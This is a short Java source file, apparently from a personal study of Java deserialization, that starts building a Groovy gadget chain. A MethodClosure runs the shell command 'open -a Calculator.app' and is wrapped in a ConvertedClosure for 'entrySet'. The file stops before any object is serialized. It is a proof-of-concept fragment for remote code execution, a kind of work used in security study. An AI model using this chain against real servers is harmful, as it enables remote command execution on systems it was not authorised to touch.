package org.su18.serialize.yoserial.Groovy;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

/**
 * @author su18
 */
public class Groovy {

	public static String fileName = "Groovy.bin";

	public static void main(String[] args) throws Exception {

		//封装我们需要执行的对象
		MethodClosure          methodClosure = new MethodClosure("open -a Calculator.app", "execute");
		final ConvertedClosure closure       = new ConvertedClosure(methodClosure, "entrySet");


	}
}
